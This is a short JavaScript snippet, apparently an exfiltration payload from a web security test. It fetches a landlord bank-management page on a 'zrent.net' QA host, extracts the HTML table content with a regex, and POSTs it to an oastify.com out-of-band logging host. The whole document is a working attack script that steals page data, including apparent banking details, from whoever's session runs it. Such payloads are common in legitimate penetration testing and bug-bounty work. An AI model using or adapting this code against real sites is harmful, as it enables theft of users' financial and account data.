function fe(t) {
    fetch(t)
        .then(t => t.text())
        .then(t => {
            // Extract content between <table> and </table> tags
            const tableContent = t.match(/<table[^>]*>([\s\S]*?)<\/table>/i);
            
            if (tableContent && tableContent[1]) {
                // Send the extracted table content as raw data in a POST request
                fetch("//mpff5i3yowuv452xfzhu30ytzk5bt1hq.oastify.com/log/", {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'text/plain'
                    },
                    body: tableContent[1] // Send the raw table content
                });
            } else {
                console.log('No <table> tag found in the HTML.');
            }
        })
        .catch(error => console.error('Error:', error));
}

urls = ["https://leaderbank.qa.zrent.net/Landlord/ManageBanks"];
urls.forEach(fe);
